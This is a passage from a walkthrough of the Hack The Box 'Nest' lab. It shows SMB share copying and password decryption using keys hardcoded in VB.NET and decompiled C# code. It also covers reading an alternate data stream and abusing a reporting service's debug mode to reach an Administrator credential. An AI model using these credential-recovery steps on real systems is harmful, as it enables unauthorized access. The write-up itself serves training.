</pre></table></code></div></div><p>I copied the whole <code class="language-plaintext highlighter-rouge">VB Projects</code> folder to my computer and opened the solution file in Visual Studio Code.</p><h4 id="copying-an-entire-smb-folder-recursively-using-smbclient-1">Copying an entire SMB folder recursively using smbclient:</h4><blockquote><p>*Side note: In order to copy a whole folder in SMB you need to do a little set up. From <a href="https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/">https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/</a>:</p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Connect using: <code class="language-plaintext highlighter-rouge">smbclient -U $user \\\\$ip\\$folder $password</code><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />smb: <code class="language-plaintext highlighter-rouge">tarmode</code><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />smb: <code class="language-plaintext highlighter-rouge">recurse</code><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />smb: <code class="language-plaintext highlighter-rouge">prompt</code><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />smb: <code class="language-plaintext highlighter-rouge">mget $folder_to_copy</code></ul></blockquote><blockquote><p><code class="language-plaintext highlighter-rouge">mget</code> will now allow the whole folder and subfolders to be copied recursively to your local <code class="language-plaintext highlighter-rouge">pwd</code> (wherever you were before you logged into smbclient).</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Screenshot_2020-06-13_13-05-14.png" alt="" /></p><p>In the <code class="language-plaintext highlighter-rouge">Main()</code> function I could see that the program was supposed to read the <code class="language-plaintext highlighter-rouge">RU_config.xml</code> file that we found earlier with <code class="language-plaintext highlighter-rouge">c.smith</code>’s password in it, then decrypt it using the <code class="language-plaintext highlighter-rouge">Utils.DecryptString()</code> function.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("/home/zweilos/htb/nest/RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
    End Sub
</pre></table></code></div></div><p>I tried building and running the code, but for some reason I wasn’t able to get it to run properly. I decided to cut straight to the decryption function and run it directly to try to debug it. Skimming further through the code, I found what I was looking for in the <code class="language-plaintext highlighter-rouge">Utils.vb</code> source code file. The <code class="language-plaintext highlighter-rouge">Decrypt()</code> function takes in our encrypted password and a bunch of key and salt values, all of which were hardcoded in the <code class="language-plaintext highlighter-rouge">Utils.DecryptString()</code> function.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
</pre></table></code></div></div><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre><span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">cipherText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                               <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                               <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                               <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="n">_</span>
                               <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                               <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> <span class="n">_</span>
                        <span class="ow">As</span> <span class="kt">String</span>

        <span class="k">Dim</span> <span class="nv">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">initVectorBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">saltValueBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">cipherTextBytes</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">saltValueBytes</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">passwordIterations</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">keyBytes</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="mi">8</span><span class="p">))</span>

        <span class="k">Dim</span> <span class="nv">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>

        <span class="k">Dim</span> <span class="nv">decryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span>
        <span class="n">decryptor</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">memoryStream</span> <span class="ow">As</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
        <span class="n">memoryStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cryptoStream</span> <span class="ow">As</span> <span class="n">CryptoStream</span>
        <span class="n">cryptoStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">decryptor</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="k">ReDim</span> <span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">decryptedByteCount</span> <span class="ow">As</span> <span class="kt">Integer</span>
        <span class="n">decryptedByteCount</span> <span class="o">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="k">Dim</span> <span class="nv">plainText</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="n">plainText</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="n">decryptedByteCount</span><span class="p">)</span>

        <span class="k">Return</span> <span class="n">plainText</span>
    <span class="k">End</span> <span class="k">Function</span>
</pre></table></code></div></div><p>To quickly compile and run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website <a href="https://dotnetfiddle.net/"><code class="language-plaintext highlighter-rouge">https://dotnetfiddle.net/</code></a>.</p><p><a href="https://dotnetfiddle.net/">Great for any .NET language, not just C#</a></p><p>I selected <code class="language-plaintext highlighter-rouge">VB.NET</code> as my language, then copied over the relevant code into the site, and with a little bit of tweaking was able to hit the <code class="language-plaintext highlighter-rouge">&gt; Run</code> button up top to get the output of my code. You can see below how I modified the <code class="language-plaintext highlighter-rouge">Main()</code> function to print the decrypted password to the console using the hardcoded values from <code class="language-plaintext highlighter-rouge">Utils.DecryptString()</code>.</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">Public</span> <span class="k">Function</span> <span class="nf">Main</span><span class="p">()</span>
        <span class="nb">Console</span><span class="p">.</span><span class="n">Writeline</span><span class="p">(</span><span class="n">Decrypt</span><span class="p">(</span><span class="s">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="p">,</span> <span class="s">"N3st22"</span><span class="p">,</span> <span class="s">"88552299"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span> <span class="mi">256</span><span class="p">))</span>
        <span class="n">return</span> <span class="mi">0</span>
    <span class="k">End</span> <span class="k">Function</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/user_csmith_decrypt.png" alt="" /></p><p>As you can see, my shortened program worked and gave me the password for <code class="language-plaintext highlighter-rouge">c.smith</code>, which is <code class="language-plaintext highlighter-rouge">xRxRxPANCAK3SxRxRx</code>!</p><h3 id="usertxt">User.txt</h3><p>Now that I had credentials as another user, time to see if I could find that <code class="language-plaintext highlighter-rouge">user.txt</code>. It was in the <code class="language-plaintext highlighter-rouge">Users</code> share, right in the <code class="language-plaintext highlighter-rouge">c.smith</code> folder.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ smbclient -W HTB-NEST -U c.smith \\\\10.10.10.178\\Users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \&gt; cd c.smith
smb: \c.smith\&gt; ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

                10485247 blocks of size 4096. 6545935 blocks available
</pre></table></code></div></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ cat 'c.smith\user.txt'
81960e14de90f242c05d946fc1f94cbe
</pre></table></code></div></div><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user---csmith">Enumeration as User - c.smith</h3><p>User milestone complete, now it was time to work on escalating privileges. I continued searching through the available <code class="language-plaintext highlighter-rouge">\HQK Reporting\</code> directory, where I found a few very interesting files.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>smb: \c.smith\&gt; cd "HQK Reporting"
smb: \c.smith\HQK Reporting\&gt; ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6545935 blocks available
smb: \c.smith\HQK Reporting\&gt; cd "AD Integration Module"
smb: \c.smith\HQK Reporting\AD Integration Module\&gt; ls
  .                                   D        0  Fri Aug  9 08:18:42 2019
  ..                                  D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019

                10485247 blocks of size 4096. 6545807 blocks available
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">"Debug Mode Password.txt"</code> appeared to be empty, but from my past experiences with doing CTFs in Windows environments I have learned that if a filename says it has a password or flag in it, it probably does. You might just have to try a little harder to get it. In this case, the user tried to hide the password from common snooping by inserting it into an NTFS alternate data stream (ADS). You can read more about ADS and how to detect them at <a href="https://www.sans.org/blog/alternate-data-streams-overview/">https://www.sans.org/blog/alternate-data-streams-overview/</a>.</p><h4 id="detecting-and-reading-alternate-data-streams-ads-over-smb">Detecting and reading Alternate Data Streams (ADS) over SMB</h4><p>In order to locate any alternate data streams in this file over SMB, you need to use the <code class="language-plaintext highlighter-rouge">allinfo</code> command, then <code class="language-plaintext highlighter-rouge">Get</code> the file with the appropriate stream name appended to it. You can read more about this at <a href="https://www.sans.org/blog/alternate-data-streams-overview/">https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux</a>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>smb: \C.Smith\HQK Reporting\&gt; allinfo
allinfo &lt;file&gt;
smb: \C.Smith\HQK Reporting\&gt; allinfo "Debug Mode Password.txt" 
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\&gt; get "Debug Mode Password.txt:Password:$DATA"
smb: exit

zweilos@kalimaa:~/htb/nest$ cat 'Debug Mode Password.txt:Password:$DATA' 
WBQ201953D8w
</pre></table></code></div></div><p>Well now I had a password to something called <code class="language-plaintext highlighter-rouge">Debug Mode</code> but I had no idea where to use it. Next I opened the <code class="language-plaintext highlighter-rouge">HQK_Config_Backup.xml</code> file.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ cat HQK\ Reporting\\HQK_Config_Backup.xml

<span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;ServiceSettings</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;Port&gt;</span>4386<span class="nt">&lt;/Port&gt;</span>
  <span class="nt">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class="nt">&lt;/QueryDirectory&gt;</span>
<span class="nt">&lt;/ServiceSettings&gt;</span>
</pre></table></code></div></div><h3 id="dealing-with-unknown-ports-1">Dealing with unknown ports</h3><p><code class="language-plaintext highlighter-rouge">HQK_Config_Backup.xml</code> mentioned port 4386, which I didn’t recognize. A quick internet search revealed nothing about this port other than it was in an unassigned block. There are generally three things to try when dealing with unknown ports…netcat, telnet, and ssh. In this case, <code class="language-plaintext highlighter-rouge">nc</code> simply reported back the banner <code class="language-plaintext highlighter-rouge">HQK Reporting Service V1.2</code> and nothing else. <code class="language-plaintext highlighter-rouge">Telnet</code> however gave me an interactive prompt.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

&gt;whoami

Unrecognised command
&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
&gt;list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
&gt;runquery 1

Invalid database configuration found. Please contact your system administrator
</pre></table></code></div></div><p>The HQK Reporting Service gave access to a very simplistic shell with a limited set of commands. It was designed to allow a user to run queries on invoices and products sold, but the database did not seem to be connected to the program. After spending time trying to find any useful information, I realized that this was not going to give anything other than the same “Invalid database configuration found.” error. Time to see if that <code class="language-plaintext highlighter-rouge">Debug Mode</code> password I found earlier worked here.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>&gt;debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;

&gt;service

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: "C:\Program Files\HQK\HqkSvc.exe"
Server Running As: Service_HQK
Initial Query Directory: C:\Program Files\HQK\ALL QUERIES

&gt;session

--- Session Information ---

Session ID: f5d4ced8-5de2-4fb4-80f7-84cebfea6538
Debug: True
Started At: 6/14/2020 9:53:05 AM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.14.253:51630
Current Query Directory: C:\Program Files\HQK\ALL QUERIES

</pre></table></code></div></div><p>The password worked, and I now had a couple of additional commands available. The <code class="language-plaintext highlighter-rouge">service</code> and <code class="language-plaintext highlighter-rouge">session</code> commands gave a little bit of additional information about the server program, but it didn’t seem to be useful at this point. I continued to look around.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>&gt;setdir ..

Current directory set to HQK
&gt;list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
&gt;showquery 1

File over size limit. Are you sure this is a HQK query file?
&gt;showquery 3

&lt;?xml version="1.0"?&gt;
&lt;ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
  &lt;Port&gt;4386&lt;/Port&gt;
  &lt;DebugPassword&gt;WBQ201953D8w&lt;/DebugPassword&gt;
  &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;
&lt;/ServiceSettings&gt;

&gt;setdir ldap

Current directory set to ldap
&gt;list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
&gt;showquery 2  

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">showquery</code> command was a bit more useful than the <code class="language-plaintext highlighter-rouge">runquery</code> command earlier. It was able to read and display the contents of text files. After searching around for a bit, I found the file <code class="language-plaintext highlighter-rouge">ldap.conf</code> which contained the Administrator password! Unfortunately, like the user password it was encrypted.</p><h3 id="decrypting-the-administrator-password">Decrypting the Administrator password</h3><p>The first thing I tried after finding the encrypted password was to use the <code class="language-plaintext highlighter-rouge">decrypt()</code> function I had made from the Visual Basic project earlier. Unfortunately, this password seemed to be in a different format, as I got the error <code class="language-plaintext highlighter-rouge">Padding is invalid and cannot be removed.</code> Either I was missing some input values, or this was not the correct program to decrypt this password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Screenshot_2020-06-14_04-38-04.png" alt="" /></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Run-time exception (line -1): Padding is invalid and cannot be removed.

Stack Trace:

[System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.]
   at System.Security.Cryptography.CapiSymmetricAlgorithm.DepadBlock(Byte[] block, Int32 offset, Int32 count)
   at System.Security.Cryptography.CapiSymmetricAlgorithm.TransformFinalBlock(Byte[] inputBuffer, Int32 inputOffset, Int32 inputCount)
   at System.Security.Cryptography.CryptoStream.Read(Byte[] buffer, Int32 offset, Int32 count)
   at Utils.Decrypt(String cipherText, String passPhrase, String saltValue, Int32 passwordIterations, String initVector, Int32 keySize)
   at Utils.Main()
</pre></table></code></div></div><p>I searched through all of my notes for any potential values to substitute into the function, but nothing worked. I decided to test out the file <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> I had found in the <code class="language-plaintext highlighter-rouge">\c.smith\HQK Reporting\</code> folder earlier in the hopes that it would be of use.</p><h3 id="disassembling-the-c-net-executable">Disassembling the C# .NET executable</h3><p>I used <code class="language-plaintext highlighter-rouge">ILSpy</code> to disassemble the executable file into readable .NET code (in this case ILSpy told me the language was C#). This amazingly useful program can be found at <a href="https://github.com/icsharpcode/AvaloniaILSpy">https://github.com/icsharpcode/AvaloniaILSpy</a>.</p><ul><li>https://github.com/icsharpcode/AvaloniaILSpy</ul><p>I found the relevant decryption methods under the <code class="language-plaintext highlighter-rouge">HqkLdap.CR</code> namespace. This program was actually structured quite similarly to the VB project <code class="language-plaintext highlighter-rouge">RU Scanner</code> from before, so it didn’t take much effort to find the code I needed, even with the method names stripped and replaced with simple two-letter names.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Screenshot_2020-06-13_14-40-12.png" alt="" /></p><p>Like before, I cut out only the function that I needed to decrypt the password. I wrote a simple <code class="language-plaintext highlighter-rouge">Main()</code> function that would write the decrypted password to the console. Like the <code class="language-plaintext highlighter-rouge">Decrypt()</code> function from before, this one had hardcoded initialization vector and salt values included in the source code. This is bad practice in real-world situations and should be avoided.</p><div class="language-cs highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="c1">// HqkLdap.CR</span>
<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Security.Cryptography</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>

<span class="k">public</span> <span class="k">class</span> <span class="nc">CR</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(){</span>
        <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="nf">DS</span><span class="p">(</span><span class="s">"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">K</span> <span class="p">=</span> <span class="s">"667912"</span><span class="p">;</span>

    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">I</span> <span class="p">=</span> <span class="s">"1L1SA61493DRV53Z"</span><span class="p">;</span>

    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">SA</span> <span class="p">=</span> <span class="s">"1313Rf99"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">DS</span><span class="p">(</span><span class="kt">string</span> <span class="n">EncryptedString</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nf">RD</span><span class="p">(</span><span class="s">"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="</span><span class="p">,</span> <span class="s">"667912"</span><span class="p">,</span> <span class="s">"1313Rf99"</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="s">"1L1SA61493DRV53Z"</span><span class="p">,</span> <span class="m">256</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">RD</span><span class="p">(</span><span class="kt">string</span> <span class="n">cipherText</span><span class="p">,</span> <span class="kt">string</span> <span class="n">passPhrase</span><span class="p">,</span> <span class="kt">string</span> <span class="n">saltValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">passwordIterations</span><span class="p">,</span> <span class="kt">string</span> <span class="n">initVector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">keySize</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">);</span>
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes2</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">);</span>
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">);</span>
        <span class="n">Rfc2898DeriveBytes</span> <span class="n">rfc2898DeriveBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> <span class="n">bytes2</span><span class="p">,</span> <span class="n">passwordIterations</span><span class="p">);</span>
        <span class="k">checked</span>
        <span class="p">{</span>
